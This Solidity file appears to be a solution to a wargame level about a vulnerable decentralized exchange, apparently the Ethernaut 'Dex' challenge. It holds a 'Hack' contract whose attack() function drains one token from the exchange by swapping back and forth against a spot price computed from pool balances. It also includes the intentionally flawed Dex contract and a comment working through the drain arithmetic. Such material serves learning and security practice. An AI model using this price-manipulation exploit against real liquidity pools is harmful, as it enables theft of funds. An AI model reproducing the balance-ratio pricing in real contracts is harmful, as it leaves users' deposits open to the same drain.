// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

//0x8e2E7e6Ba07751Cc4eB2FB8ACeFAa46F8E783682 contract address;

//token1=0xAD4d79cd26a67c4916B7C96f921D54CEdF320ef6
//token2=0x6FAE440d02d0C80f3355aC78A8684B636664104c
interface IDex {
    function swap(address from, address to, uint amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) external view returns (uint);

    function token1() external view returns (address);

    function token2() external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(address _dex) {
        dex = IDex(_dex);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(
            address(tokenIn),
            address(tokenOut),
            IERC20(tokenIn).balanceOf(address(this))
        );
    }
}

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    /*
    ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)
           
              token1 =10 | token2=10  total token1=100 total token2=100
-> token1=10  token1 =0 | token2=10  total token1=110 total token2=90  -> token2=10
              token1 =0 | token2=20  total token1=110 total token2=90 
 -> token2=20 token1 =0 | token2=0  total token1=110 total token2=110  -> token1=24
              token1 =24 | token2=0  total token1=86 total token2=110 
              token1 =0 | token2=30  total token1=110 total token2=80 
              token1 =41 | token2=0  total token1=69 total token2=110 
              token1 =0 | token2=65  total token1=110 total token2=45 
             110=(amount*110)/45
             amount=45;

 
    */

    function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
